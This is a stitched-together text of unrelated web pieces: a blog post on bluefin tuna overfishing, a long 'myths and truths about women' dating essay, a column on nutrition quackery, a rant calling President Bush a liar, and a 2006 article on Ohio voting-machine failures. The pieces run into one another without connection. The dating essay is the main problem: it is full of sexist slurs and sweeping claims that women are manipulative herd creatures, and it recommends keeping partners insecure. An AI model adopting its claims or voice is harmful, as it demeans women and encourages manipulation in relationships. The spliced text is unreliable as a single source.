As a firm believer in the freedom of speech , he said he was opposed to the idea of tighter government regulation or censorship of web - based video content .
Troubles for Tuna – Could This Mean No More Toro Sushi ?
According to a recent World Wildlife Fund report , tuna stocks worldwide are at risk of depletion due to overfishing .
Could this mean no more maguro and toro for sushi fans ?
Currently , tuna fleet capacity is far greater than required to catch a sustainable level of the fish .
This , coupled with disputes over allocation of fishing quotas , and plain old illegal fishing have led to overfishing of one of our favorite sushi items .
The Atlantic bluefin tuna is severely over fished and the spawning stock of the Southern bluefin is now down almost 90 % .
In addition to poaching , there appears to be deliberate misreporting of catches and even “ tuna laundering ” which is hiding the actual number of tuna caught .
Some tuna catches are apparently being processed at sea before being transferred to larger ships headed for Japan , effectively shielding the poachers from law enforcement officials and flouting quota management .
While the best way to save the species from total collapse would be a grassroots tuna protest or an embargo on maguro and toro , it does n’t take a brain surgeon to realize that it wo n’t happen that way .
Too many people care too much about eating their tuna to give it up and make a point .
We do , however , need to let the world know that sustainable fishing must be enforced to save the tuna from going the way of the dodo .
Unlike some fish , such as hamachi ( yellowtail ) no one has yet to find a way to farm tuna , leaving sustainable fishing our only option .
Fleets from the European Union ( mainly France ) , Libya and Turkey appear to be the main offenders , according to the report .
The 42 nation International Commission for the Conservation of Atlantic Tunas — in which the European Union plays a major role — is responsible for regulating the fishing quotas .
That said , the annual quota of 32,000 tons , set by ICCAT , was broken by over 40 percent in 2004 with a catch of 44,948 tons , and rose to 45,547 in 2005 .
The actual catches are likely to be well over 50,000 tons — a figure confirmed by the ICCAT scientific committee .
Without adherence to international quotas , we may not have enough tuna left in a few years to have even a sustainable breeding population , let alone chutoro for our plate .
Joe Borg , European Commissioner for Fisheries and Maritime Affairs , is being urged to step up to the plate and close the fisheries that are putting the bluefin tuna at risk .
We will just have to see how strongly he feels about maintaining the stability of the world ’s bluefin tuna stocks at the next ICCAT meeting in November .
Hopefully for the sushi fans of the world , we will see some action soon .
If things work out , your otoro may be a little more expensive than it has been , but at least it wo n’t be going away forever , and that ’s something I can support .
Meshi agare !

MYTH : Women want love and affection .
Women want to be treated well .
If you treat a woman well , she 'll treat you well .
TRUTH : Young women want whatever other young women want .
They 're herd creatures .
If you lavish a woman with love and affection she 'll think you 're doing it because nobody else wants you ( which may be true ) and she 'll dump you .
In fact , if you do anything that betrays that you 're a loser that other women wo n't touch , she 'll dump you .
Why ?
Because she wants to impress her friends with what a great catch she 's made , and if she thinks that they would n't want you , then she does n't want you either .
There are only three exceptions to this rule .
The first exception is psychos , otherwise known as " witches , bitches , and crazy ladies . "
They 'll stay with you because nobody else wants them , or because you 're the only one who put up with their abuse .
The second exception is women who like to " fix men up " : those women who like to take " broken " men and turn them into the man they want .
These women are single because a mature man will recognize that these women do n't want him ... they want to turn him into someone else .
The third exception is that once in a long time you meet a woman who is n't psycho , still wants to stay with you when she finds out that you 're not super stud , and does n't want to change you into someone else .
This is the one you marry .
BITTER MYTH : Women are out for money .
TRUTH : Women are out for status and fun or for security , depending upon their age .
A few women are out for cold cash , but not too many .
Status - seeking women are n't ready to settle down .
They just wanna have fun , and they want their girlfriends to know it .
They 're looking for a guy they can dangle in front of their friends and say , " Look what I got ! "
You do n't have to have money to be that guy , you just have to come across as desirable .
Of course if you have money you do n't need to do anything else , but having no money is n't the end of the world .
The women who are out for security have had their wild fling and want to settle down .
They want a guy who can provide a stable base for the future ( and that includes finances ) .
All in all it 's sort of like what guys do ( and women whine about endlessly ) : when you 're young you want some bright , bubbly thing with huge tits , a nice ass , and a trimmed bush who screams like a banshee in bed , although you 'll settle for much less ; when you 're ready to get married you want a nice girl who is n't going to break your balls .
They 're usually different people unless you 're very , very lucky .
Young women want bad boys who will show them a good time .
When they 're ready to get married they want some guy who is going to be able to pay to keep them comfortable .
MYTH : Women are out for looks .
TRUTH : See above .
Women are out for looks , after a fashion .
A guy in good physical shape who wears decent - looking clothes is attractive because he looks after himself and probably is n't a wimp or a whiner .
She can convince her friends that he 's a " catch . "
A guy who looks and smells like a laundry bin , or who can't climb a few flights of stairs without a rest had better have some spectacular attribute to show off to her friends ( like being a genius ) or he 's not worth her time .
Any guy can compensate for lack of looks or lack of money with showmanship .
He does n't have to be a catch , just seem like one .
All he has to do is make her friends think , " Damn , I wish I were going out with him instead of the loser I 'm with .
"
MYTH : I should find one woman I like who likes me , and stick with her through thick and thin .
TRUTH : This is the biggest mistake I ever made .
I used to be loyal to whomever I was with , even when someone better came along .
All that happened was that I missed out on some great opportunities while I hung on with losers that ended up dumping me anyway .
Do this if the two of you are getting married ; once you 've tied the knot it 's a whole other can of worms .
However , if you 're just dating , do exactly the opposite .
In very subtle ways you have to let her know that although you like her , there are lots of other women out there and you still notice them .
Glance at tits and legs .
Smile at and chat with pretty ladies , even while she 's with you ( you 're just being friendly , of course ) .
This is the most important thing I 've learned about dating in a decade .
I even thought of dating WASP bitches again , so long as I could keep this in mind .
Never , never let her know that she 's the only game in town .
As soon as she believes that she 's your " everything , " she 'll start whining and bitching and making demands .
Think of it like buying a car .
If you let the salesman know that this is your dream car , that you 've stayed awake nights thinking about buying exactly this car , do you think the price will go down ?
Of course not !
He 'll jack the price up as high as he thinks he can go and still have you buy it .
If you tell your girl that you 've dreamed all of your life of going out with someone like her , do you think she 'll smile and kiss you and things will go on as before ?
Of course not !
She 'll realize that you 'll put up with more of her bad habits , and that she can put up with fewer of yours , and the bitching will start .
She 'll try to make the relationship as comfortable for her as possible and still keep it going .
Remember the car salesman ?
Remember the attitude that " this is a nice car , but there are hundreds of other great ones , including that one across the street " , even as your heart is thumping and you 're practically drooling ?
If you 're just dating , this is the attitude to take .
MYTH : Having a girlfriend / fiancée / wife means being able to tell someone my problems .
TRUTH : Nobody gives a shit about your problems .
Nobody ever will .
I know that sounds harsh , but it 's the reality of being a man .
Want to tell people about your problems ?
Get a sex change .
Or join a men's group ; the flip side is that you have to listen to their problems , but it helps .
I know of only two kinds of women who want to hear about your problems : ones with far more problems than you have , and ones who fancy themselves amateur psychiatrists and like " fixing " men .
Neither is good company .
Let 's face it : many women spend all day whining to their friends about how awful their lives are and listening to their neurotic friends responding in kind .
The last thing they want to do is go out with you and hear more of the same .
To make matters worse , women simply do n't " get " many of men 's problems .
Women have problems with things that do n't even bother us , but they expect us to be understanding or at least tolerant ; we have problems with things that do n't even bother them , and no amount of explaining will cause the light to go on or elicit any sympathy .
So why not just commit hara - kiri now ?
Because it 's not that bad .
You get over it .
In particular , once you figure out how to handle women a lot of your problems seem smaller and more manageable .
MYTH : Having a girlfriend / fiancée / wife means someone will finally understand me .
TRUTH : Understanding — true understanding — takes decades .
If you spend most of your time with the love of your life trying to explain yourself , she will have nothing but contempt for you , for two reasons .
First , because she does n't want to hear your whining ( see above ) .
Second , and more important , women want to maintain the self - delusion that they already understand men .
Women everywhere claim that they understand men and that " men are simple creatures . "
The truth is that women have n't a clue where most men are coming from and furthermore they care only insofar as they want to control us .
Nonetheless , they want to maintain the fiction that they have us figured out .
It 's a pride and status thing .
A woman who does n't " understand " her man can't control him , and a woman who can't control her man is a loser .
The more you try to explain yourself , the more complex and multi-dimensional you become ( a.k.a. " difficult " ) , and the less she can claim to understand you .
Besides , most of the time you 're explaining yourself to her you 're really trying to figure yourself out .
Go do it in a corner , hire a professional listener , or join a men 's group .
She does n't want to hear it .
If you master the art of keeping your problems to yourself she will complain bitterly about this .
She will bitch and whine that you 're not open enough and that she has to drag things out of you .
She will also secretly love this .
It gives her one more thing to complain about to her friends .
MYTH : If only I could meet the right woman , my life would have meaning .
TRUTH : If your life does n't have meaning right now , when you 're single , then a relationship is n't going to help .
You 'll pile too much baggage on top of the delicate emotional bonds too early , and the whole thing will collapse like a house of cards .
Want to see this in action ?
Watch women : they do this all the time .
In particular , women who whine about men who can't make a commitment are probably doing exactly this : looking to a man to make their life mean something .
It does n't work .
The only way to have a happy life is to develop one for yourself , then leave an opening for someone else to come and share it with you .
Neither of these two things is easy .
In particular , it 's too easy once you 've developed a life for yourself to end up with someone who was doing exactly what you were doing before — waiting for Prince Charming ( or in your case Lady Love ) — to come and rescue her life .
People like this end up draining away all of that energy you 've worked so hard to build up , leaving you exhausted and frustrated .
Take it from me : I waited for Lady Love for decades .
Finally I gave up , got angry , got off my ass and tried to make a life for myself , and suddenly I was surrounded by women who wanted to date me .
After a while I met someone who was very special to me and I married her .
Now my life is about the same as before , but I have someone with whom to share it .
As much as I prefer being with someone , I must tell you that having her with me does n't make my life any more or less meaningful .
I 'm pretty much where I was before , only now I have company , which is nice .
[ P.S. : After two years she turned into one of those people who was waiting for her life to mean something , and she drained away all of my good energy .
Oh well .
Some things just do n't turn out as planned , no matter how hard you try .
Rats . ]
MYTH : If I treat a woman well and listen to what she says , she 'll stop complainingTRUTH : Women never stop complaining .
For them , it 's a sport .
Some complain more than others , but none of them will ever stop , any more than one day men will stop discussing football .
Men have built civilizations , created law , invented husbandry ( that 's keeping domestic animals by the way , not marriage ; women invented marriage ) , built skyscrapers , invented cars , washing machines , antibiotics , toilets , computers , and microwave ovens , and generally dragged us out of caves and into condos .
Do n't kid yourself : men did it all .
If it were up to women we 'd still be living in caves and dying at 20 .
I know that men did it all because I know why they did it : they hoped that it would stop women complaining .
It did n't .
If you listen to your girlfriend 's bitching and try to make everything better , you 'll suffer the same fate as all the men who came before : you 'll run yourself ragged , and at the end of it all she 'll still be bitching .
If you ignore all but the most important complaints , she 'll bitch about that , too , but you 'll feel far better about your life .
MYTH : Men do n't listen to women because men do n't care about women .
TRUTH : Men ignore women because women normally have nothing worthwhile to say .
This is not a condemnation of women , but rather a difference in what talking is for .
This is one of the few areas where John Gray has something useful to say .
Men mull things over , organize things in their heads , then speak .
Men have to do this because they have to get things done , and if they blabbered all day long about nothing in particular then eventually other men would pay them no attention .
Men talk to communicate ideas , negotiate compromises , and secure cooperation .
Life and experience has taught men to be brief and pithy .
Women talk to organize their thoughts .
It 's the difference between doing the math problem in your head and writing the answer at the top of the page , and scribbling all over the page in order to arrive at the answer in the bottom corner .
Women want men to listen to them .
Women want men to follow along as they scribble all over the page , not just wait for the answer .
Quite frankly , who cares ?
As I mentioned above , there are lots of things that women do n't want to hear from men .
If you want to talk about these things , you 'll have to find some other men who want to listen , because she sure as hell wo n't .
If she wants to attach her mouth to her brain and vocalize all of her mental processes then she should find someone who cares to listen , in other words another woman .
MYTH : She said she loves me .
She must think I 'm really special .
TRUTH : When women say , " I love you " it can mean almost anything .
" I want to spend the rest of my life with you , " " I 'm desperate to get married and have babies and you 're the best thing I 've come across so far , " " You 're better than the last jerk I went out with , " " You 're the best guy I 've come across this week , " " All my girlfriends are in love and I want to be too , " " I have a million problems and I want you to feel obliged to listen to them , " " I want another date and I want you to feel like you have to ask me out again , " " It 's time I put my foot down and started controlling you , " and any number of other things .
OK , most women think they mean it when they say , " I love you . "
However , remember the old saying , " It 's a woman 's prerogative to change her mind " ?
She loves you this minute .
Maybe today .
Maybe this week .
Maybe even this month .
However , this says nothing about how she will feel next month , next week , or tomorrow .
One of the biggest problems men like me have is that when we say , " I love you " to a woman we want to really mean it .
Like " I love you forever . "
Men do n't understand that a woman can say , " I love you forever " and change her mind next week .
All she does is convinces herself that in hindsight , and despite everything you 've ever said or done , you never really loved her , so all the times she said , " I love you " did n't really count .
You have to learn to use the same language .
Go ahead and say , " I love you , " but inside your head say , " I love you right now .
Tomorrow may be a different story . "
When you break up and she screams that you said you loved her , tell her that you did , but she did this and that and now you do n't love her any more .
When women say , " I love you " they are n't promising eternal devotion , so why should you be ?
One day you 'll meet a woman who says , " I love you " and it 'll really hit home .
You 'll test her love a bit and it will hold up .
That 's the one you marry .
MYTH : Women understand relationships ; men do n't .
TRUTH : This myth is perpetuated by women , pussy - whipped men , and psychiatrists .
If women truly understood relationships ... that is , if they understood relationships with men ... then we would n't have a 45 % divorce rate .
Maybe back in the pioneer days women understood relationships .
These days , they have coffee with their girlfriends , talk about " men " , examine and dissect relationships , study interpersonal dynamics , talk , talk , talk about what works and what does n't , then go out and perfectly screw up their next relationship .
I know .
I 've watched it happen from the sidelines .
Women spend more time analyzing relationships ; they talk about them incessantly , and in doing so discover more truths than men know .
However , all of this talk in a vacuum also means that their heads are filled with more bullshit and myth than are men's .
The combination of superior insight and copious nonsense puts them right back where we are .
Men tend to see what 's going on in a relationship more clearly , but have no idea how to express what they see or what to do about it .
Women would probably know what to do about it if they could only see it as it truly is , instead of through a fog of preconception .
The other big difference between the sexes is that women are absolutely certain that they know what is going on , whereas men make no such claim .
The last man who claimed to have his own radical theories about relationships was Freud , and nobody pays any attention to him any more .
It is women 's ideas about relationships and why they do or do n't work that have been imported lock , stock , and barrel into the field of psychiatry .
Most male therapists you 'll meet are basically honorary women with university degrees , and as such they do n't really understand relationships either .
MYTH : Women are fairer and more even - handed than menTRUTH : Nothing could be further from the truth .
Traditionally men have favoured the same rules for everyone : " He who lives by the sword dies by the sword . "
Women on the other hand make up the rules as they go along .
Although women 's approach is patently unfair , it was valuable when they had to be the ones to point out that the rules needed to be changed , or that the rules should be bent in some cases .
Back then they did this for the good of everyone .
These days men still feel bound by rules , but women are in a conflict of interest .
They still keep watch over the rules and break them as they always have , but now they modify and break the rules in their own favour .
Men 's justice is often harsh , but it 's fair .
Women 's justice is arbitrary and these days often self - serving .
( Liberal " situational ethics " are essentially the same as women 's ethics . )
You 'll find this out quickly in a relationship .
The joke going around about " The Rules " and how women change them all the time is n't such a joke .
It 's a documentary .
If you doubt this , think of it this way .
A man caught breaking or bending the rules of good behaviour will become either defensive or repentant ; his wife will beat him over the head with his transgression for months , if not years .
A woman caught modifying the rules of good behaviour to suit herself will giggle and freely admit it .
She thinks it 's a game .
MYTH : Women do a lot for the relationship ; men do a lot for themselvesTRUTH :
My ex-girlfriend invented a little ditty that made her puff up with smug , self - satisfied pride .
It went like this , " Women think of ' we ' ; men think of ' me ' . "
OK , so e.e. cummings she was n't .
The point is that she actually believed this , and a lot of other women do , too .
She thought that she was living and breathing our " relationship , " while I was just kind of hanging around and taking up space .
Meanwhile , I drove her everywhere ( she could n't drive ) , I spent hours making her gifts and writing her notes , and I spent hours thinking about what was going on with us and where we were going .
The truth of the matter is that women do n't think of ' we ' any more or less often than men do .
Women think of their own needs most of the time , too .
The difference is that women redefine their own needs as being those of " the relationship " .
For example , when a man needs to talk to his belle about something , he says , " I need to talk to you . "
When a woman needs to talk to her beau about something , she says , " We need to talk . "
Notice the difference ?
Suddenly what she needs becomes what we need .
Women do this all the time , and then pout and whine that they work so hard at the relationship and you do n't .
In fact they 're just playing with words .
The other truth is that there are two relationships : the one you 're really in — the one that exists between you and her — and the one in her head .
Remember how women are always talking and theorizing about " relationships " ?
Well , much of what she defines as " our relationship " is really just a collection of theories and prejudices from past conversations with her girlfriends , and has nothing to do with what 's going on between the two of you .
In that sense , even if she is doing more for " the relationship , " it is n't necessarily anything that concerns her real relationship with you .
MYTH : Women are more involved in the relationship ; men are more aloof .
TRUTH : Finally one that 's true .
The false part is the assumption that being deeply involved in the relationship is always a good thing , and that aloofness is fatal to relationships .
If you doubt this , look around you and find a couple in which both people do little else but sit around with each other and talk , and watch how fast the relationship blows itself apart .
Every relationship has to have a balance between looking inward and looking outward .
Most women who complain that their men do n't pay enough attention to " the relationship " are n't seeing the relationship clearly and / or are buried in " the relationship " up to their necks and so are creating more problems than they solve .
Recently I was skimming a book by Dr. Laura and saw a chapter that gets this one right .
Where is it written that when a man wants to go back to college and a woman wants to get married , and she gets angry that he 's " not thinking of the relationship " that she 's automatically right ?
Maybe the right thing to do at that moment is for both of them to go back to college for a couple of years .
Women confuse obsessing about " the relationship " with healthy involvement , particularly considering that half the time they 're seeing stuff that is n't even there .
Sometimes your relationship needs more attention than you 're giving it ; other times she 's smothering it .
The assumption that more involvement equals more love simply is n't true .
MYTH : When she says no , she means no ( so why am I so confused ) ?
TRUTH : Nobody means no every time they say " no . "
Think about it : do you ?
You 've never said no when you were too shy to say yes ?
You 've never said no because you were nervous , did n't know what you were getting into , and did n't really have time to think about your answer ?
You 've never said no because you thought that was the right thing to do even though you really wanted to say yes ?
You 've never said no and then changed your mind ?
You 've never said no as a joke , just to get a rise out of someone , when you really meant yes ?
I 've done all of these things at one time or another ; most men I know have , and most women I know have as well .
However , for men there 's a catch .
If she 's prone to saying no when she really means yes , then you should dump her .
Immediately .
Especially if she 's told you in no uncertain terms " no " and then starts dropping huge hints that you 're supposed to ignore this and go for it anyway .
Dump the bitch .
This is just far too dangerous .
If you doubt this , imagine sitting in court , accused of rape .
" Did she tell you no , Mr. Smith ? "
" Yeah , but afterward she tried to rip my pants off , then stripped naked and sat on my face ! "
" But did she say no , Mr. Smith ? " " Umm ... yes she did . "
" Case closed .
" I once went out with a woman who told me , on our second date , that there was no way she would sleep with me , that her ex-boyfriend was coming to visit and that it would be " too complicated " if she were sleeping with me when he came to stay .
On our third date she did everything to let me know that she wanted me , including lying on my bed , making comments about removing her clothes for a nude massage .
Spooked , I drove her home , dropped her off , and never went out with her again .
I consider it one of the smartest things I 've done in my dating life .
( Incidentally , apparently so does she .
Every time I meet her she asks why I do n't call her any more . )
MYTH : Women are social geniuses ; all women get along well with each other , while men just fightTRUTH : I lived in a mixed - sex dorm for two years in university where each floor was segregated by sex .
It alternated : one floor men , one floor women , one floor men , etc .
A few nearby residences were completely mixed .
A couple of the men's floors looked much the worse for wear at the end of the year .
You know , men are so destructive .
The women 's floors all looked perfect .
All the girls were smiling and friendly .
Talk to any of them , however , and they 'd tell you that they hated living on an all - female floor , and every last damned one of them was moving to the mixed dorms the very next year , and not with each other .
According to them , underneath the tidy rooms and smiles were claws and forked tongues .
Every day was a quiet , mannerly , pitched social battle .
The men , on the other hand , got along just fine with only a few exceptions .
Most of us were quite happy where we were , the only complaint being that we did n't see the ladies enough .
One thing that is true along the lines of this myth is that any woman will defend another woman against a man , even a woman that she does n't know .
Start bad - mouthing women , even a particular woman that is n't known to " present company , " and you 'll find women defending her even though they have no idea what 's going on .
If anyone — a woman or another man—verbally attacks a man , other men will not jump in and defend him .
Why ?
Men assume that other men can look after themselves and , after all , they 're competition .
Women assume that an attack on one woman is an attack on all women .
BITTER MYTH : Women are all the same .
TRUTH : Women are not all the same , and in particular women change with age .
A woman who would n't give you a second look at 15 may be asking you out at 35 .
In part this is the dreaded " biological clock " at work , but in part it 's also changing priorities .
At 15 she wants to impress all of her friends with her " catch " and she is starting to learn to control men .
She wants variety and excitement .
At 25 she wants to have fun with no strings attached and wants to hone her controlling skills .
She wants more stability but she does n't want Ward Cleaver or Bill Gates .
At 35 she realizes that the fun days are over and it's time to settle down and get serious .
Boring , nerdy guys who were dog meat at 15 can be studs at 35 .
The guys grow up and mature , they learn to need women less , and they settle into a life of resigned solitude , which means that they cheer up because they 're no longer striving for something they can't have .
The field narrows , and there are fewer single guys with no divorce history .
Finally , her priorities have changed .
She 's no longer impressed by " bad boys " on motorcycles with a few convictions for petty crime .
She knows that her friends are n't impressed by flashy , fast - living rogues any longer , any more than they 're still impressed by fashions from Suzy Creamcheese .
She 's more interested in building a nest than impressing her friends anyway ( and she knows that building a nest is what will impress them ) .
So , just because you can't get anywhere now does n't mean that your whole life will be a write - off .
Take a clue from me : I never had a single date in high school .
I had one girlfriend for a year in University .
Ten years later I was beating women off with a stick .

It would be almost too easy to poke fun at Dr Gillian McKeith PhD , just because she ’s been busted by the Medicines and Healthcare Regulatory Authority this week for selling sordid medicinal products without a license .
But as my girlfriend could happily tell you , I ’m not a complicated man .
So , Ms McKeith ’s “ Wild Pink ” and “ Horny Goat Weed ” sex supplements are sold for “ maintaining erections , orgasmic pleasure , ejaculation … lubrication , satisfaction , and arousal ” , and sexual pleasure is , historically , the natural domain of quackery : but without the appropriate license , demonstrating safety , quality , and efficacy , her products were illegal .
Interestingly , although the contemporary nutritionism movement likes to present itself as a thoroughly modern and evidence based enterprise , the food guru industry , with its outlandish promises , moralising , and sexual obsessions , goes back at least 170 years .
Like our modern food gurus , the historical figures of nutritionism were mostly enthusiastic lay people ; and just like our modern food gurus , they all claimed to understand nutritional science , nature , evidence , and medicine , better than the scientists of their time .
The advice and the products may have shifted with the prevailing religious and moral notions of the time , but they have always played to the market , be it puritan or liberal , new age or christian .
Graham crackers are a digestive biscuit , not entirely unhealthy , invented by Sylvester Graham , the first great advocate of vegetarianism and nutritionism as we would know it , and proprietor of the world ’s first health food shop .
Like his descendants today , Graham mixed up sensible notions – like cutting down on cigarettes and alcohol – with some other rather more esoteric ideas which he concocted for himself , warning that ketchup and mustard , for example , can cause “ insanity ” .
I ’ve got no great beef with the organic food movement , but it ’s still interesting to note that Graham ’s health food store – in 1837 – heavily promoted its food as being grown according to “ physiological principles ” on “ virgin unvitiated soil ” .
This was soil that had not been “ subjected ” to the “ overstimulation ” of manure .
Soon these food marketing techniques were picked up by more overtly puritanical religious zealots like John Harvey Kellogg ( he of the cornflake ) .
Kellogg was a natural healer , masturbation campaigner , and health food advocate , promoting his granola bars as the route to abstinence , temperance , and solid morals .
He ran a sanitarium for private clients , using “ holistic ” techniques , including McKeith ’s favourite , colonic irrigation .
I particularly enjoy the bit in Kellogg ’s “ Treatment for Self - Abuse and its Effects ” , where he recommends circumcision : “ The operation should be performed by a surgeon without administering an anesthetic , as the brief pain attending the operation will have a salutary effect upon the mind , especially if it be connected with the idea of punishment .
In females , the author has found the application of pure carbolic acid to the clitoris an excellent means of allaying the abnormal excitement . ”
Kellogg also advocated exposing the tissue on the glans , so that it smarted nastily with friction during self - pollution .
You do have to wonder about the motives of anyone who thinks the problem through in that much detail .
By the early 20th century a man called Bernard MacFadden had updated the nutritionism model for contemporary moral values , and so became the most commercially successful drugless therapist of the era .
The pseudoscience and the posturing were the same , but he used liberal sexuality to his advantage , selling his granola bars as a food that would promote a muscular , thrusting , lustful lifestyle , in that decadent rush that flooded the population between the wars .
And interestingly , MacFadden ’s food product range was complemented by a more unusual invention of his own .
The “ Peniscope ” was a popular suction device designed to enlarge the male organ which is still used by many today , in a modestly updated form .
Since this may be your only opportunity to learn about the evidence on penis enlargement , it ’s worth mentioning that there is , in fact , some evidence that stretching devices can increase penis size .
So to judge by the MHRA ruling , rather charmingly , as it happens , MacFadden ’s Peniscope may have a better evidence base for its claims than either his own food products , or McKeith ’s Horny Goat Love Bar .

Transcripts below the fold
( rough transcript by reader Steve )
I think it 's because lying is hard work , and he 's trying to hold several different false scenarios in his head while not blurting out what he 's really being told behind closed doors .
Bush looks like a person stumbling over the easiest things , but in fact , he 's not a person unable to relate simple facts .
He 's a person trying hard to NOT relate simple facts .
He 's a person trying to avoid the pitfalls of saying what 's on his mind , and trying to keep his stories straight .
As I lawyer , I see people trying to construct false scenarios all the time .
But you do n't remember lies the way you remember truth .
It 's easier to remember , e.g. , how fast you were driving than it is to remember the exact lie you told the police officer about how fast you were driving .
People who lie have to put a lot of energy into keeping their lies consistent with each other and , well , consistent with undeniable facts .
My grand theory is that Bush 's entire presidency , from the beginnings of his campaign until now , is based on his taking public stances that at least obscures goals and positions shared secretly .
He and his Roves have always accepted that the majority of the country would n't want him if they knew the promises he made to the right wing christians and the rich , if they knew the actual effect of his tax cuts , if they knew the evidence behind environmental damage , and on and on .
Now , he 's hiding the entire foreign policy fiasco(s ) , who is being held by him incognito , who is being spied upon , what he knew before 9/11 , and on and on and on .
If you had so much to hide , you too would only use canned speeches , carefully vetted by speechwriters who do n't know the real story anyway , to keep it all straight , and you would stumble and hem and haw in all other circumstances .
Which explains why his problem was n't so evident as Texas Governor .
Bush 's brand of crony capitalism and piestic christianism went down well in Austin , at least for a governor with no real constitutional authority : Bush only had to repackage himself for the national race , essentially submerge his real persona and his real ideas and his real goals and pretend to a compassionate , not - asshole conservativism .
You know how they tell you , on a date , just be yourself ?
And how you think , no , I do n't want her to meet that guy just yet ?
Well , Bush and Rove have been saying that for six years , and Bush has been schizo , trying to send signals and winks and nods to his fundamentalist christians and send money to his corporate sponsors while slinging a load of bull at the nation .
Add to that all the bodies he has to keep buried , and you 've got a guy who is in a state of flop sweat every time he has to open his mouth in public .
Bush is n't senile , or drug addled .
He 's a lying asshole .
And it 's hard work .
Only truly gifted and intelligent sociopaths like Rove and Cheney can rattle it off .
Bush can't .
As we move toward the November mid-terms , we 're beginning to a more detailed and depressing picture of exactly what we 're up against as a nation in less than a week : two major new reports from independent research groups detail the myriad security breaches , and procedural and technical problems in the 2006 Ohio primaries ; stories from early voting in Texas indicate that the paperless DREs in at least two counties may have a partisan bias ; another major new report from the University of Connecticut details a whole raft of security vulnerabilities in Diebold 's optical scan voting machines ; finally , BlackBoxVoting.org has released " push this , pull here " instructions for multiple voting on a Sequoia DRE , no hacking skills necessary .
None of this news bodes well for the November mid-terms , which are less than a week away .
In fact , what the reports described below indicate is that voters will flock to the polls to vote on fragile , untested alpha systems that , when they break , cannot be fixed by the on - site poll workers ; the votes that are recorded cannot be adequately verified by a post- election audit , even if a voter - verified paper " receipt " is printed by each machine and saved by the county ; and individual counties may or may not have the technical capacity to actually carry out the task of tabulating all of the electronic results ( forget about the paper receipts ! ) from all of the machines in a coherent and reliable manner .
In sum , people will show up on November 7th at many precincts across America , they will select items on a touch - screen , a lucky few of them will see a paper record of their choices ( correctly marked or not ) scroll by under a glass , and they will return home having participated in a bit of high - tech political theater that may or may not amount to a bona fide election .
If you think that I overstate things just a bit here , then by all means , read on .

Way to go , Ohio
With over one million voters on its rolls , Cuyahoga is one of Ohio 's biggest and most important counties .
On May 2 , 2006 , Cuyahoga residents used the Diebold AccuVote TSx , the same DRE model on which my most recent election article focused , to cast votes in a federal primary that was publicly marred by major problems with machine failure , long voter lines , and a host of other issues .
Shortly after it became apparent that the May 2nd federal primary had encountered serious problems , the county Board of Elections commissioned two different investigations into what went wrong .
The results of both of these investigations have just become public this week , and they paint a picture that 's about as grim as one could possibly imagine .
Both reports found so many serious problems with procedures and technology that it 's hard to know where to begin .
So let 's start with the short and no - so - sweet summary of the Election Science Institute ( ESI ) report 's key finding :
Key Finding :
After three months of exhaustive research , empirical evidence supports the key definitive finding :
The machines ' four sources of vote totals — VVPAT [ voter - verified paper audit trail ] individual ballots , VVPAT summary , election archive , and memory cards — did not agree with one another .
The current election system appears to provide some of its promised benefits at potentially great cost ; namely , that the election system , in its entirety , exhibits shortcomings with extremely serious consequences , especially in the event of a close election .
Much of the press coverage that will come out about this report will probably spend most of the time rehearsing some of the more dramatic of the 234 - page report 's findings .
This being the case , I want to encourage you to read other coverage of this report , like the latest Wired News article by Kim Zetter , because I intend to focus here on some of the big - picture take - aways from the report .
Lack of training and vendor blackmail
One third of poll workers reported problems setting up the machines , and 45 % reported problems closing them out after the election .
74 % of poll workers said that their preparatory training was either " a lot different " or " somewhat different " than the procedures and situations that they actually encountered on election day .
Majorities also said that their technical training was inadequate , they did not have enough hands - on practice with the machines , and their training in election law and administrative procedures was inadequate .
Aside from general problems at the polls , what does this lack of training ultimately portend for the Nov. 7 mid-term elections ?
Essentially , non-technically - savvy election officials were coaxed into making a very large information technology purchase based on a few demos and some vendor - sponsored " testing , " and now they 're unable to admit their mistake publicly for fear of making it exponentially worse .
According to my sources , many election officials in Cuyahoga and elsewhere have now come to a private understanding that they blew it , big - time , by buying these systems and rushing them out in what amounts to an untested alpha ( not even beta ! ) state .
But if they publicly admit that they were wrong , then the voting machine vendors will withdraw their support and the counties will be left to fly solo on election day .
Because of the kind of inadequate training outlined in the ESI report , this would basically shut down the mid-term elections , because county election workers at all levels — from poll workers to sysadmins to Board of Elections officials — would be unable to run an election without massive vendor support .
In short , do n't expect to hear any mea culpas or backpedalling from county or state election officials at any point before Nov. 7th .
These folks are now on the hook for tens of millions of dollars worth of equipment that simply does not , and cannot , work as advertised , and if they own up to this publicly then what little hope they still have of holding real elections on the 7th will go right out the window along with the withdrawn vendor support .
Lack of training and precinct meltdowns
The median age of volunteer poll workers is 69 .
Now , try to imagine what an inadequately trained , non-technical senior citizen is going to do when a voting machine starts acting up in a crowded precinct during a high - turnout election .
If poll workers respond anything like they did on May 2 , then the ESI report indicates that they 're going to just start randomly rebooting and swapping memory cards and pressing buttons , and just generally making a bad situation much , much worse .
The poll workers have neither the tools nor the training to fix these systems when they go down , and when even minor glitches start to occur on election day , when the pressure is on , tensions are high , and qualified support personnel are hard to get hold of either on the phone or in person , you can expect that a precinct will deteriorate very quickly .
Machine malfunction and possible fraud
Of the widespread problems encountered on primary day , the most common type involved voter registration ( 30.1 % ) , with election administration problems ( mistakes in procedures , inadequate training , supply shortages , etc. ) coming in second ( 20.6 % ) , and problems with the actual voting equipment coming in third at 16.2 % .
In the latter category were machine failures , problems with the printers for the VVPAT , encoder and access card problems , problems with the seals and labels on the various components , etc .
The lack of machine IDs and proper labeling on the canisters containing the paper rolls may not sound like a big deal , but it 's huge .
According to one common reading of an Ohio statute that is almost certain to be litigated in the aftermath of the coming electoral disaster , these paper print - outs are the official legal record of the vote in the state ; they 're the ultimate and final authority on voter intent .
So why is it that many of the canisters did n't have proper labels on them that enabled them to be paired with a voting machine ?
I certainly hope it's not because someone with access to a common roll printer of the type used in the AccuVote went and printed out a bunch of counterfeit votes , stuffed them into canisters , and passed them to the BOE .
The fact that the votes recorded on these rolls did n't match any of the other vote tallies does n't give one much confidence , though ( more on this below ) .
It 's also discouraging that 87 of these rolls of votes have gone missing , and no one has yet recovered them .
Another 40 rolls were damaged , either by crumpling or because the printing was n't legible .
Yes , folks , we 're talking about the official , legal record of the vote in Cuyahoga County .
Nothing adds up
The other major cluster of problems that this report highlights concerns the actual vote counting and audit procedures .
Specifically , the four different kinds of vote totals available from the machines — individual voter receipts , machine summary receipts , the in - memory election archive , and the contents of the machines ' memory cards — did not add up .
Due to a variety of problems known and unknown , each of these four sources of information gave different vote totals .
